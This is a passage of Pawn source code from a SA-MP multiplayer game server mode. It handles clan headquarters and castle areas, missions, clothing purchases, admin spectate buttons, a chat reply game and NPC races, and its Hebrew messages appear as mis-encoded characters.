					for(new i = 0, col = GetPlayerColor(playerid); i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == c) SendClientMessage(i,col,string);
					playerinfo[playerid][securitydelay] = 20;
				}
				if(playerinfo[playerid][clan] != c && !claninfo[c][cpeace][playerinfo[playerid][clan]])
				{
					if(claninfo[c][csystems][clansys_alert] && claninfo[c][csystemparam][clansys_alert])
					{
						ClanNotification(c," * [/alert off ьсщшхь фюЄ°ы· ,/alert mute рцЄў· фўьря фхЇЄьф [ьф∙·ўф");
						claninfo[c][calert][1] = 1;
					}
					if(claninfo[c][csystems][clansys_security] && claninfo[c][csystemparam][clansys_security]) claninfo[c][csecurity] = 7;
				}
			}
			if(Options[16][optActive])
			{
				SavePlayerWeapons(playerid);
				ResetWeapons(playerid);
				GiveWeapon(playerid,24,9999);
				GiveWeapon(playerid,27,9999);
				GiveWeapon(playerid,31,9999);
				GiveWeapon(playerid,34,9999);
			}
		}
		case area_viewhq: if(viewhqinfo[areainfo[areaid][areaparam]][hqvalid] && playerinfo[playerid][logged])
		{
		    new size = viewhqinfo[areainfo[areaid][areaparam]][hqsize], str[M_S];
		    format(str, sizeof(str), " Х юЇўуф цх юхту°· ы"@c(blue)"%s"@c(yellow)" хЇЁхщф ь°ыщ∙ф Єсх° "@c(blue)"%s$",viewhq_descs[size], Comma(viewhq_prices[size]), areainfo[areaid][areaparam]);
		    SendClientMessage(playerid, yellow, str);
		    format(str, sizeof(str), " Х [юё' фюЇўуф %d] " @c(blue) "/buyhq"@c(yellow)" - ь°ыщ∙· фюЇўуф",areainfo[areaid][areaparam]);
		    SendClientMessage(playerid, yellow, str);
			playerinfo[playerid][invhq] = areainfo[areaid][areaparam];
		}
		case area_castle:
		{
		    playerinfo[playerid][castle] = areainfo[areaid][areaparam];
			new a = playerinfo[playerid][castle], c = cainfo[a][caCapture], p = playerinfo[playerid][clan], bool:s = cainfo[a][caStartCapture];
			if(c != -1) format(string,sizeof(string)," .{%s}%s {27DE55}с°хъ фср ь%s шщ°ф цх Ёыс∙ф Є''щ фўьря",ClanHexColor(c),claninfo[c][cname],CastlesAreas[a][caName]);
			else format(string,sizeof(string)," .с°хъ фср ь%s",CastlesAreas[a][caName]);
			SendClientMessage(playerid,green,string);
			if(p != 0)
			{
			    UpdateCasltePlayers(a);
			    if(cainfo[a][caClans][p] >= MAX_CASTLE_CAPTURE_PLAYERS && !s && cainfo[a][caNewCapture] == 0)
			    {
			        format(string,sizeof(string),"!фў°с Єь {%s}%s " @c(lightblue) "фчь, юш°· фўьрЁщэ фщр ь∙°ху сюфьъ ∙·щщэ хчЎщ уўх· Єэ чющ∙ф ∙чўЁщэ",CastlesAreas[a][caColor],CastlesAreas[a][caName]);
			        SendClientMessageToAll(lightblue,string);
			        GangZoneFlashForAll(cainfo[a][caGangZone],rgba2hex(claninfo[p][ccolor][0],claninfo[p][ccolor][1],claninfo[p][ccolor][2],250));
					cainfo[a][caStartCapture] = true, cainfo[a][caCaptureTime] = MAX_CASTLE_CAPTURE_TIME;
			    }
			}
		}
		case area_cp:
		{
			DisablePlayerCheckpoint(playerid);
			new cpid = areainfo[areaid][areaparam];
			if(cpinfo[cpid][cpactive] && playerinfo[playerid][cp] == -1 && !playerinfo[playerid][specp] && (cpinfo[cpid][cptype] != cp_abank || (cpinfo[cpid][cptype] == cp_abank && IsPlayerMAdmin(playerid))))
			{
				SetPlayerCheckpoint(playerid,cpinfo[cpid][cpx],cpinfo[cpid][cpy],cpinfo[cpid][cpz],cpinfo[cpid][cpsize]);
				playerinfo[playerid][cp] = cpid;
			}
		}
		case area_tele, area_nstele:
		{
			if(areainfo[areaid][areatype] == area_nstele)
			{
				new c = SavePlayerWeapons(playerid);
				if(c > 0)
				{
					ResetWeapons(playerid);
					if(!playerinfo[playerid][noticedmsg][19])
					{
						SendClientMessage(playerid,darkred," .∙щэ ьс: рёх° ьщ°х· срцх° цф. фЁ∙ўщэ ∙ьъ Ёьўчх ююъ, хщхчц°х ьъ ы∙·Ўр юфрцх°");
						playerinfo[playerid][noticedmsg][19] = 1;
					}
					else SendClientMessage(playerid,darkred," .∙щэ ьс: рёх° ьщ°х· срцх° цф");
				}
			}
			playerinfo[playerid][tparea] = areaid;
		}
		case area_object:
		{
			if(areainfo[areaid][areaparam] == oarea_fountain) playerinfo[playerid][infountain] = 1;
		}
		case area_money:
		{
			new ma = areainfo[areaid][areaparam];
			if(playerinfo[playerid][inmarea] == -1)
			{
				format(string,sizeof(string)," $ !" @c(lightgreen) "%s" @c(darkgreen) " с°хъ фср ьрцх° фыёє $",MoneyAreas[ma][maName]);
				SendClientMessage(playerid,darkgreen,string);
			}
			playerinfo[playerid][inmarea] = ma;
		}
	}
	#if lagtest
		LagTest_End("OnPlayerEnterDynamicArea");
	#endif
	return 1;
}
//=[OnPlayerLeaveDynamicArea]===================================================
public OnPlayerLeaveDynamicArea(playerid,areaid)
{
	#if lagtest
		LagTest_Start("OnPlayerLeaveDynamicArea");
	#endif
	new string[M_S];
	switch(areainfo[areaid][areatype])
	{
		case area_hq:
		{
			if(claninfo[playerinfo[playerid][clan]][cruling][0] > 0 && GetPlayerHQ(playerid) == claninfo[playerinfo[playerid][clan]][cruling][0] && playerinfo[playerid][hqcheck] == -1)
			{
				SendClientMessage(playerid,red," !щЎр· юрцх° фўьря ∙р·ф ·хўє, Єьщъ ьчцх° ьрцх° ·хъ 5 ∙Ёщх· рч°· фўьря ∙ьъ Єьхь ьфы∙ь сю∙щю· фф∙·ьшх·");
				SetTimerPck(playerinfo[playerid][hqcheck],"CheckHQAttack",5000,0,"ii",playerid,1);
			}
			new c = areainfo[areaid][areaparam];
			if(playerinfo[playerid][clan] != c && !claninfo[c][cpeace][playerinfo[playerid][clan]] && claninfo[c][csystems][clansys_alert] && claninfo[c][csystemparam][clansys_alert] && claninfo[c][calert][1])
			{
				new left = 0;
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][clan] != c && GetPlayerHQ(i) == c && !claninfo[c][cpeace][playerinfo[i][clan]]) left++;
				if(!left)
				{
					ClanNotification(c," * [/alert off рцЄў· фўьря фхЇёўф [ьсщшхь фюЄ°ы·");
					claninfo[c][calert][1] = 0;
				}
			}
			playerinfo[playerid][inhq] = 0;
			if(Options[16][optActive])
			{
				SetPlayerAmmo(playerid,24,0);
				SetPlayerAmmo(playerid,27,0);
				SetPlayerAmmo(playerid,31,0);
				LoadPlayerWeapons(playerid);
			}
		}
		case area_viewhq: playerinfo[playerid][invhq] = -1;
		case area_castle:
		{
			new a = playerinfo[playerid][castle], p = playerinfo[playerid][clan];
			if(p != 0) UpdateCasltePlayers(a);
			playerinfo[playerid][castle] = INVALID_CASTLE_ID;
		}
		case area_cp:
		{
			if(!playerinfo[playerid][specp])
			{
				DisablePlayerCheckpoint(playerid);
				playerinfo[playerid][cp] = -1;
				ReloadCPs(playerid);
			}
		}
		case area_tele, area_nstele:
		{
			if(areainfo[areaid][areatype] == area_nstele)
			{
				new c = CountSavedWeapons(playerid);
				if(c > 0)
				{
					LoadPlayerWeapons(playerid);
					SetPlayerArmedWeapon(playerid,0);
					if(!playerinfo[playerid][noticedmsg][20])
					{
						format(string,sizeof(string)," .фхчц°х %s ф∙щтх°щэ ∙Ёьўчх ююъ ы∙ф∙·т°· ь∙щтх°",Teleports[playerinfo[playerid][tparea]][Tcmd]);
						SendClientMessage(playerid,green,string);
						playerinfo[playerid][noticedmsg][20] = 1;
					}
				}
			}
			playerinfo[playerid][tparea] = -1;
		}
		case area_object:
		{
			if(areainfo[areaid][areaparam] == oarea_fountain) playerinfo[playerid][infountain] = 0;
		}
		case area_money:
		{
			playerinfo[playerid][inmarea] = -1;
		}
	}
	playerinfo[playerid][parea] = -1;
	#if lagtest
		LagTest_End("OnPlayerLeaveDynamicArea");
	#endif
	return 1;
}
//=[OnPlayerEnterDynamicCP]================================================
public OnPlayerEnterDynamicCP(playerid, checkpointid)
{
	new string[M_S];
	if(checkpointid == playerinfo[playerid][mcheckpoint] && playerinfo[playerid][mission] != INVALID_MISSION_ID)
	{
	    PlaySound(playerid,1057);
		playerinfo[playerid][mstatus]++;
		DestroyDynamicPickup(playerinfo[playerid][mpickup]);
		DestroyDynamicCP(playerinfo[playerid][mcheckpoint]);
		if(playerinfo[playerid][mstatus] != (MAX_MISSION_TARGETS+1))
		{
			GenerateMissionPickup(playerid,playerinfo[playerid][mission]);
			format(string,sizeof(string),"~r~Status: ~w~%d/%d",playerinfo[playerid][mstatus],MAX_MISSION_TARGETS);
			PlayerTextDrawSetString(playerid,playerinfo[playerid][mtexts][2],string);
			PlayerTextDrawShow(playerid,playerinfo[playerid][mtexts][2]);
			format(string,sizeof(string)," [%d/%d] фю∙ьхч фтщЄ сфЎьчф ьщЄу, ЁхЎ° ьъ ю∙ьхч чу∙ сюЇф",playerinfo[playerid][mstatus], MAX_MISSION_TARGETS);
			SendClientMessage(playerid,lightyellow,string);
		}
		else if(playerinfo[playerid][mstatus] == (MAX_MISSION_TARGETS+1))
		{
		    missions[playerinfo[playerid][mission]] = false;
			for(new t = 0; t < 3; t++) PlayerTextDrawDestroy(playerid,playerinfo[playerid][mtexts][t]);
			format(string,sizeof(string),"Mission-%d",playerinfo[playerid][mission]);
			if(!Reward_Check(playerid,string))
			{
				Reward_Give(playerid,string);
			    GiveMoney(playerid,headserver != playerid ? MissionsInfo[playerinfo[playerid][mission]][msMoney] : MissionsInfo[playerinfo[playerid][mission]][msMoney]*2, 43);
				format(string,sizeof(string)," Х /Missions ?ёщщэ р· %s хўщсь %d$ сф·рэ ь°ю· фю∙щюф, °хЎщэ ьЁёх· %s",MissionsInfo[playerinfo[playerid][mission]][msName],MissionsInfo[playerinfo[playerid][mission]][msMoney],GetName(playerid));
				SendClientMessageToAll(green,string);
			}
            playerinfo[playerid][mstimenew] = 15*60;
			RemovePlayerMapIcon(playerid,icon_mission);
			playerinfo[playerid][mission] = INVALID_MISSION_ID;
			DestroyVehicle(playerinfo[playerid][mvehicle]);
			playerinfo[playerid][mstatus] = 0;
			DestroyVehicle(playerinfo[playerid][mvehicle]);
			DestroyDynamicCP(playerinfo[playerid][mcheckpoint]);
			DestroyDynamicPickup(playerinfo[playerid][mpickup]);
			SetPlayerVirtualWorld(playerid, world_normal);
		}
	}
	return 1;
}
//=[OnPlayerEditAttachedObject]=================================================
public OnPlayerEditAttachedObject(playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ)
{
	switch(playerinfo[playerid][editing])
	{
		case edit_attached_clothes:
		{
			if(!IsPlayerInStore(playerid,store_clothes)) SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· фстущэ сыущ ьсЎЄ ЇЄхьф цх");
			else
			{
				if(response)
				{
					if(fScaleX != 1.0 || fScaleY != 1.0 || fScaleZ != 1.0) ShowPlayerDialog(playerid,dialog_clothesmsg,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ЄщЎхс",@c(red) " .ьр Ёщ·я ьф∙·ю∙ сыЇ·х° ∙щЁхщ тхуь ььсх∙","чц°ф","щЎщрф");
					else if(floatabs(fOffsetX) > 1.5 || floatabs(fOffsetY) > 1.5 || floatabs(fOffsetZ) > 1.5) ShowPlayerDialog(playerid,dialog_clothesmsg,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ЄщЎхс",@c(red) " .ўсЄ· ющўхэ °чхў ююъ","чц°ф","щЎщрф");
					else if(GetMoney(playerid) < (playerinfo[playerid][clothescost][0]+playerinfo[playerid][clothescost][1])) ShowPlayerDialog(playerid,dialog_clothesmsg,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ЄщЎхс",@c(red) " .рщя ьъ юёЇщў ыёє ь∙ьэ Єь фстущэ фрьф! ·∙р° Є°хэ","чц°ф","щЎщрф");
					else
					{
						if(playerinfo[playerid][clothesclick][0] == 0)
						{
							playerinfo[playerid][clothes] = playerinfo[playerid][clothesclick][2];
							playerinfo[playerid][clothesp][0] = fOffsetX;
							playerinfo[playerid][clothesp][1] = fOffsetY;
							playerinfo[playerid][clothesp][2] = fOffsetZ;
							playerinfo[playerid][clothesp][3] = fRotX;
							playerinfo[playerid][clothesp][4] = fRotY;
							playerinfo[playerid][clothesp][5] = fRotZ;
							if(playerinfo[playerid][logged])
							{
								fsetint(fuser(playerid),"ClothesID",playerinfo[playerid][clothes]);
								fsetfloat(fuser(playerid),"ClothesX",playerinfo[playerid][clothesp][0]);
								fsetfloat(fuser(playerid),"ClothesY",playerinfo[playerid][clothesp][1]);
								fsetfloat(fuser(playerid),"ClothesZ",playerinfo[playerid][clothesp][2]);
								fsetfloat(fuser(playerid),"ClothesRX",playerinfo[playerid][clothesp][3]);
								fsetfloat(fuser(playerid),"ClothesRY",playerinfo[playerid][clothesp][4]);
								fsetfloat(fuser(playerid),"ClothesRZ",playerinfo[playerid][clothesp][5]);
							}
						}
						else
						{
							playerinfo[playerid][clothes2] = playerinfo[playerid][clothesclick][2];
							playerinfo[playerid][clothes2p][0] = fOffsetX;
							playerinfo[playerid][clothes2p][1] = fOffsetY;
							playerinfo[playerid][clothes2p][2] = fOffsetZ;
							playerinfo[playerid][clothes2p][3] = fRotX;
							playerinfo[playerid][clothes2p][4] = fRotY;
							playerinfo[playerid][clothes2p][5] = fRotZ;
							if(playerinfo[playerid][logged])
							{
								fsetint(fuser(playerid),"Clothes2ID",playerinfo[playerid][clothes2]);
								fsetfloat(fuser(playerid),"Clothes2X",playerinfo[playerid][clothes2p][0]);
								fsetfloat(fuser(playerid),"Clothes2Y",playerinfo[playerid][clothes2p][1]);
								fsetfloat(fuser(playerid),"Clothes2Z",playerinfo[playerid][clothes2p][2]);
								fsetfloat(fuser(playerid),"Clothes2RX",playerinfo[playerid][clothes2p][3]);
								fsetfloat(fuser(playerid),"Clothes2RY",playerinfo[playerid][clothes2p][4]);
								fsetfloat(fuser(playerid),"Clothes2RZ",playerinfo[playerid][clothes2p][5]);
							}
						}
						ShowPlayerDialog(playerid,dialog_clothesmsg,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ЄщЎхс",@c(green) " .фЄщЎхс фчу∙ Ё∙ю° сфЎьчф","чц°ф","щЎщрф");
						GiveMoney(playerid,0-(playerinfo[playerid][clothescost][0] + playerinfo[playerid][clothescost][1]));
						playerinfo[playerid][clothescost] = {0,0};
					}
				}
				else OnDialogResponse(playerid,dialog_clothes,1,playerinfo[playerid][clothesclick][0],"");
			}
			RefreshClothes(playerid);
		}
		case edit_attached_test:
		{
			new string[M_S];
			format(string,sizeof(string),"%d,%d,%.4f,%.4f,%.4f,%.4f,%.4f,%.4f,%.4f,%.4f,%.4f",modelid,boneid,fOffsetX,fOffsetY,fOffsetZ,fRotX,fRotY,fRotZ,fScaleX,fScaleY,fScaleZ);
			SendClientMessage(playerid,white,string);
		}
	}
	SetFreeze(playerid,0);
	return 1;
}
//=[OnPlayerClickTextDraw]======================================================
public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
	new string[M_S];
	if(clickedid == Text:INVALID_TEXT_DRAW)
	{
		if(playerinfo[playerid][pModelID] > 0)
		{
			model_DestroySelectionMenu(playerid);
			CallLocalFunction("OnPlayerModelSelection","dddd",playerid,0,playerinfo[playerid][pModelID],-1);
			PlayerPlaySound(playerid,1085,0.0,0.0,0.0);
		}
        return 1;
	}
	if(clickedid != Text:INVALID_TEXT_DRAW) PlaySound(playerid,5205);
	if(clickedid == spectext[0]) // Spec: View
	{
		playerinfo[playerid][specbuttons] = false;
		for(new i = 1; i < sizeof(spectext)-1; i++) TextDrawHideForPlayer(playerid,spectext[i]);
		CancelSelectTextDraw(playerid);
		SendClientMessage(playerid,grey," (/specb :ьфчц°· ыЇ·х°щ фюЄўс ф∙·ю∙ сЇўхуф)");
	}
	else if(clickedid == spectext[1]) // Spec: Ban
	{
		playerinfo[playerid][punishdia] = playerinfo[playerid][spectate];
		format(string,sizeof(string),":%s Ёр ьфўьщу ёщсф ьсря ью∙·ю∙",GetName(playerinfo[playerid][spectate]));
		ShowPlayerDialog(playerid,dialog_ban,DIALOG_STYLE_INPUT,@c(lightblue) "сря",@c(grey) ":Ёр ьфўьщу ёщсф ьсря","!сря","сщшхь");
	}
	else if(clickedid == spectext[2]) // Spec: Kick
	{
		playerinfo[playerid][punishdia] = playerinfo[playerid][spectate];
		format(string,sizeof(string),":%s Ёр ьфўьщу ёщсф ьўщў ∙ь",GetName(playerinfo[playerid][spectate]));
		ShowPlayerDialog(playerid,dialog_kick,DIALOG_STYLE_INPUT,@c(lightblue) "ўщў",@c(grey) ":Ёр ьфўьщу ёщсф ьўщў","!ўщў","сщшхь");
	}
	else if(clickedid == spectext[3]) // Spec: Boom
	{
		format(string,sizeof(string),"/explode %d",playerinfo[playerid][spectate]);
		command(playerid,string);
	}
	else if(clickedid == spectext[4]) // Spec: Slap
	{
		format(string,sizeof(string),"/sislap %d",playerinfo[playerid][spectate]);
		command(playerid,string);
	}
	else if(clickedid == spectext[5]) // Spec: Kill
	{
		SetPlayerHealth(playerinfo[playerid][spectate], 0);
	}
	else if(clickedid == spectext[6]) // Spec: Ban: Godmod
	{
		format(string,sizeof(string),"/ban %d gm",playerinfo[playerid][spectate]);
		command(playerid,string);
	}
	else if(clickedid == spectext[7]) // Spec: Ban: Weapons
	{
		format(string,sizeof(string),"/ban %d wh",playerinfo[playerid][spectate]);
		command(playerid,string);
	}
	else if(clickedid == spectext[8]) // Spec: Ban: Speed
	{
		format(string,sizeof(string),"/ban %d sh",playerinfo[playerid][spectate]);
		command(playerid,string);
	}
	else if(clickedid == spectext[9] && playerinfo[playerid][spectate] != -1) command(playerid,"/specoff"); // Spec: OFF
	else if(clickedid == gambletxt[2])
	{
		if(playerinfo[playerid][gambleinfo][2] > 0) return SendClientMessage(playerid,red," ...ёсьЁх·");
		if(GetMoney(playerid) < playerinfo[playerid][gambleinfo][1]) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє");
		playerinfo[playerid][gambleinfo][2] = 3;
		GiveMoney(playerid,0-playerinfo[playerid][gambleinfo][1]);
		PlaySound(playerid,4201);
	}
	else // Other
	{
		if(playerinfo[playerid][showstats] != INVALID_PLAYER_ID)
		{
			new bool:found = false;
			for(new i = 0; i < sizeof(StatsFields) && !found; i++) if(clickedid == StatsFields[i][sfTD][0] || clickedid == StatsFields[i][sfTD][1])
			{
				UpdateStatsFields(playerid,"select",i);
				found = true;
			}
			//if(!found) UpdateStatsFields(playerid,"hide");
		}
		if(playerinfo[playerid][editingborder])
		{
			/*PlayerTextDrawHide(playerid,playerinfo[playerid][border][19]);
			PlayerTextDrawHide(playerid,playerinfo[playerid][border][21]);
			PlayerTextDrawHide(playerid,playerinfo[playerid][border][22]);
			PlayerTextDrawHide(playerid,playerinfo[playerid][border][23]);
			if(playerinfo[playerid][showingtxd][txd_map]) ShowTXD(playerid,txd_map,'h');
			playerinfo[playerid][editingborder] = 0;*/
			Border(playerid,"dselect");
		}
		if(playerinfo[playerid][cp] > 0) if(cpinfo[playerinfo[playerid][cp]][cppar] == gambling_machine) GamblingFunction(playerid,"end");
		if(playerinfo[playerid][specbuttons] && playerinfo[playerid][spectate] != -1) command(playerid,"/specoff"); // Spec: OFF
	}
	return 1;
}
//=[OnPlayerClickPlayerTextDraw]================================================
public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
	new string[M_S];
	PlaySound(playerid,5205);
	new curpage = playerinfo[playerid][pModelPage];
	new listid = playerinfo[playerid][pModelID];
	if(listid > 0)
	{
		if(playertextid == ModelsText[playerid][5])
		{
			model_HideSelectionMenu(playerid);
	  		CallLocalFunction("OnPlayerModelSelection","dddd",playerid,0,listid,-1);
			PlayerPlaySound(playerid,1085,0.0,0.0,0.0);
			return 1;
		}
		if(playertextid == ModelsText[playerid][3])
		{
			if(curpage < (model_GetPages(ModelTypes:listid) - 1))
			{
			    playerinfo[playerid][pModelPage] = curpage+1;
				model_UpdateModels(playerid,ModelTypes:listid);
				model_UpdatePage(playerid,ModelTypes:listid);
				PlayerPlaySound(playerid,1083,0.0,0.0,0.0);
			}
			else PlayerPlaySound(playerid,1085,0.0,0.0,0.0);
			return 1;
		}
		if(playertextid == ModelsText[playerid][4])
		{
		    if(curpage > 0)
			{
			    playerinfo[playerid][pModelPage] = curpage-1;
		    	model_UpdateModels(playerid,ModelTypes:listid);
		    	model_UpdatePage(playerid,ModelTypes:listid);
		    	PlayerPlaySound(playerid,1084,0.0,0.0,0.0);
			}
			else PlayerPlaySound(playerid,1085,0.0,0.0,0.0);
			return 1;
		}
		new itemat = playerinfo[playerid][pModelPage] * SELECTION_ITEMS;
		for(new i = 0; i < SELECTION_ITEMS; i++, itemat++)
		{
		    if(playertextid == ModelsSelect[playerid][i])
			{
				PlayerPlaySound(playerid,1083,0.0,0.0,0.0);
				new item_id = ModelInfo[listid][mModels][itemat];
				model_HideSelectionMenu(playerid);
				OnPlayerModelSelection(playerid,1,listid,item_id);
				return 1;
			}
		}
	}
	if(playertextid == playerinfo[playerid][border][3]) ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "фр·° ∙ьЁх",@c(yellow) ":ы·хс· фр·° ∙ьЁх фщр\n" webpage "\n\n\n" @c(lightyellow) "!рЁх юцющЁщэ рх·ъ ьфыЁё хьф∙··є сўфщьф ∙ьЁх тэ срщЁш°Ёш","ётх°",""); // Border: Webpage
	else if(playertextid == playerinfo[playerid][border][5]) ShowPlayerConstDialog(playerid,dialog_border_me); // Border: Nickname
	else if(playertextid == playerinfo[playerid][border][6]) command(playerid,"/level"); // Border: Level
	else if(playertextid == playerinfo[playerid][border][8]) // Border: Bank
	{
		format(string,sizeof(string),@c(white) "$%d" @c(green) " :щ∙ ьъ ы°тЄ сч∙схя фсЁў",playerinfo[playerid][bank]);
		if(!levels[playerinfo[playerid][level]][BankLimit]) format(string,sizeof(string),"%s\n" @c(green) "ютсь· ч∙схя фсЁў: " @c(white) "рщя ютсьф",string);
		else format(string,sizeof(string),"%s\n" @c(white) "$%d" @c(green) " :ютсь· ч∙схя фсЁў",string,levels[playerinfo[playerid][level]][BankLimit]);
		format(string,sizeof(string),"%s\n\n" @c(white) "$%d" @c(green) " :Єьщъ щ∙",string,GetMoney(playerid));
		ShowPlayerDialog(playerid,dialog_border_bank,DIALOG_STYLE_MSGBOX,@c(lightblue) "ыёє",string,"ьсЁў","ётх°");
	}
	else if(playertextid == playerinfo[playerid][border][10]) // Border: DateTime
	{
		new td[6];
		gettime(td[0],td[1],td[2]);
		getdate(td[3],td[4],td[5]);
		format(string,sizeof(string),@c(white) "%02d:%02d:%02d" @c(purple) " :∙Єф",td[0],td[1],td[2]);
		format(string,sizeof(string),"%s\n" @c(white) "%02d/%02d/%04d" @c(purple) " :·р°щъ",string,td[5],td[4],td[3]);
		format(string,sizeof(string),"%s\n" @c(purple) "щхэ: " @c(white) "%s",string,GetDay(td[3],td[4],td[5],1));
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "·р°щъ х∙Єф",string,"ётх°","");
	}
	else if(playertextid == playerinfo[playerid][border][12]) // Border: Friends
	{
		new list[MAX_FRIENDS], c = 0;
		list = GetFriends(playerid,c);
		if(!c) ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "чс°щэ",@c(red) ".ьр ЁюЎрх чс°щэ ючхс°щэ","ётх°","");
		else
		{
			for(new i = 0; i < c; i++) format(string,sizeof(string),!strlen(string) ? ("%s%d) %s - ID %03d") : ("%s\n%d) %s - ID %03d"),string,i+1,GetName(list[i]),list[i]);
			ShowPlayerDialog(playerid,dialog_border_friends,DIALOG_STYLE_LIST,@c(lightblue) "чс°щэ ючхс°щэ",string,"PM","ётх°");
		}
	}
	else if(playertextid == playerinfo[playerid][border][19]) command(playerid,"/map"); // Border: Map
	else if(playertextid == playerinfo[playerid][border][20]) command(playerid,playerinfo[playerid][vehicle][1] == -1 ? ("/callv") : ("/hidev")); // Border: Vehicle
	else if(playertextid == playerinfo[playerid][border][21]) ShowPlayerConstDialog(playerid,dialog_border_setting); // Border: Info
	else if(playertextid == playerinfo[playerid][border][22]) Border(playerid,"dselect"); // Border: Cancel
	return 1;
}
//=[Replytest]==================================================================
public Replytest()
{
	#if lagtest
		LagTest_Start("Replytest");
	#endif
	if(debugstate) printf("Gamemode Activity [start]: Replytest");
	new string[M_S], length = randomEx(4,30);
	replytestlevel = (length / 7) + 1, replytesttime = 0.0;
	if(replytestlevel > 3) replytestlevel = 3;
	SendClientMessageToAll(0xFAEAA9FF,"Х Х Х Х Х [ " @c(lightyellow) "ЇЄщьх· Ў'рш" @h(FAEAA9) " ] Х Х Х Х Х");
	SendClientMessageToAll(lightblue," :юсчя чц°ф ю·чщь Єы∙щх! Єьщыэ ьфўьщу сЎ'рш р· фшўёш фср сюфщ°х· фрЇ∙°щ·");
	format(replytest,sizeof(replytest),GenerateRandomString(length,true,false,true,replytestlevel >= 2));
	replytest[0] = !random(2) ? randomEx('A','Z'+1) : randomEx('1','9'+1);
	format(string,sizeof(string),replytest);
	for(new i = 0, m = random(4), rndcol[10]; i < m; i++)
	{
		format(rndcol,sizeof(rndcol),"{%s}",HexStringOfColor(rgba2hex(255 - random(6),255 - random(6),255 - random(6),255)));
		strins(string,rndcol,random(strlen(string)));
	}
	SendClientMessageToAll(white,string);
	switch(replytestlevel)
	{
		case 1: string = "ўь";
		case 2: string = "сщЁхЁщ";
		case 3: string = "ў∙ф";
	}
	format(string,sizeof(string)," (°ю· ўх∙щ: %s)",string);
	SendClientMessageToAll(white,string);
	SendClientMessageToAll(orange," Х !ф°р∙хя ∙щы·хс р· фшўёш щцыф сёыхэ ыёЇщ ьЇщ °ю· фўх∙щ хьЇщ юфщ°х· фы·щсф ∙ьх");
	SendClientMessageToAll(0xFAEAA9FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	chatacttimer = SetTimer("Replytest2",30000,0), replytesttimer = SetTimer("ReplytestTimeCount",10,1);
	CActID = 3;
	#if lagtest
		LagTest_End("Replytest");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: Replytest");
	return 1;
}
//=[Replytest2]=================================================================
public Replytest2()
{
	#if lagtest
		LagTest_Start("Replytest2");
	#endif
	if(debugstate) printf("Gamemode Activity [start]: Replytest2");
	if(strlen(replytest) > 0)
	{
		SendClientMessageToAll(red," !рє рчу ьр фёЇщў ьфўьщу р· фшўёш ∙Ёщ·я сцюя");
		format(replytest,sizeof(replytest),"");
		replytesttime = 0.0;
		KillTimer(replytesttimer);
		CActID = -1;
	}
	#if lagtest
		LagTest_End("Replytest2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: Replytest2");
	return 1;
}
//=[ReplytestTimeCount]=========================================================
public ReplytestTimeCount() return (replytesttime += 0.01), 1;
//=[StartNPCRace]===============================================================
public StartNPCRace(playerid,blevel)
{
	new string[M_S], botid, v;
	format(string,sizeof(string),"maxnpc %d",GetServerVarAsInt("maxnpc") + 1);
	SendRconCommand(string);
	format(string,sizeof(string),"RaceBot_%d",blevel);
	botid = ReturnUser(string,INVALID_PLAYER_ID);
	if(IsPlayerConnected(botid)) Kick(botid);
	ConnectNPC(string,string);
	botid = ReturnUser(string,INVALID_PLAYER_ID);
	v = CreateVehicleEx(blevel ? 541 : (blevel == 3 ? 411 : 451),0.0,0.0,0.0,0.0,-1,-1,respawntime,0,GetPlayerVirtualWorld(playerid));
	PutPlayerInVehicle(botid,v,0);
	vehicleinfo[v][locked] = 1;
	Attach3DTextLabelToPlayer(Create3DTextLabel(string,white,0.0,0.0,0.0,50.0,GetPlayerVirtualWorld(playerid),0),botid,0.0,0.0,0.2);
	SetPlayerSkin(botid,255);
	SetPlayerColor(botid,rgba2hex(random(256),random(256),random(256),155));
	SetTimerEx("EndNPCRace",180000,0,"ii",playerid,botid);
	return 1;
}
//=[EndNPCRace]=================================================================
public EndNPCRace(playerid,bot)
{
	new Float:p[3], v = GetPlayerVehicleID(playerid), string[M_S];
	GetVehiclePos(v,p[0],p[1],p[2]);
	SetVehicleToRespawn(v);
	SetPlayerPos(playerid,p[0],p[1],p[2] + 2.5);
	SpawnPlayer(playerid);
	DestroyVehicleEx(GetPlayerVehicleID(bot));
	Kick(bot);
	format(string,sizeof(string),"maxnpc %d",GetServerVarAsInt("maxnpc") + 1);
	SendRconCommand(string);
	return 1;
}
//=[HideMarkers]================================================================
public HideMarkers(playerid,id)
{
	if(!IsPlayerConnected(id) || !playerinfo[id][invisible]) return 0;
	SetPlayerMarkerForPlayer(playerid,id,GetColor(id,0));
	return 1;
}
//=[ObjectTimerAct]=============================================================
public ObjectTimerAct(objectid,exp,eq,des,vw)
{
	#if lagtest
		LagTest_Start("ObjectTimerAct");
	#endif
	new Float:p[3];
	GetSObjectPos(objectid,p[0],p[1],p[2]);
	if(exp > 0) CreateExplosionVW(p[0],p[1],p[2],exp,eq ? 0.3 : 1.0,vw);
	if(des) DestroySObject(objectid);
	#if lagtest
		LagTest_End("ObjectTimerAct");
	#endif
	return 1;
}
//=[SR_MoveObjectByTimer]=======================================================
public SR_MoveObjectByTimer(objectid,Float:x,Float:y,Float:z,Float:s,des)
{
	if(!objectinfo[objectid][ovalid]) return 0;
	MoveSObject(objectid,x,y,z,s);
	objectinfo[objectid][odam] = des;
	return 1;
}
//=[RemoteCreateSObject]========================================================
